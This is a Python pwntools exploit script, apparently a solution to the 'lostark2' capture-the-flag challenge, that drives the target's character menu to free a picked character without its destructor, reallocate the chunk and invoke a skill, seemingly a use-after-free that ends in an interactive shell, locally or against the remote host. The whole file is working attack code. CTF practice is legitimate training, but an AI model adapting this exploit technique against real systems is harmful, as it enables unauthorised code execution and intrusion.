#!/usr/bin/python
from pwn import *
import sys

LOCAL = True

HOST = "lostark2.sstf.site"
PORT = 1337
PROCESS = "./patch"

def create(type, name):
	r.sendline("1")
	r.sendlineafter(": ", str(type))

	if type != 7:
		r.sendlineafter(": ", name)

	r.recvuntil("pick: ")

def choose(idx):
	r.sendline("4")
	r.sendlineafter(": ", str(idx))
	r.recvuntil("pick: ")

def delete(idx):
	r.sendline("2")
	r.sendlineafter(": ", str(idx))
	r.recvuntil("pick: ")

def exploit(r):
	create(7, "")			# create lupeon
	create(1, "A"*(0x60))	# create random char
	
	
	choose(0)		# choose lupeon
	choose(1)		# frees picked char (not calling dtor)

	create(1, "A"*(0x40))	
	choose(0)
	r.sendline("6")			# use skill (will be lupeon skill)
	
	r.interactive()
	
	return

if __name__ == "__main__":
	if len(sys.argv) > 1:
		LOCAL = False
		r = remote(HOST, PORT)		
	else:
		LOCAL = True
		r = process("./patch")
		print (util.proc.pidof(r))
		pause()
	
	exploit(r)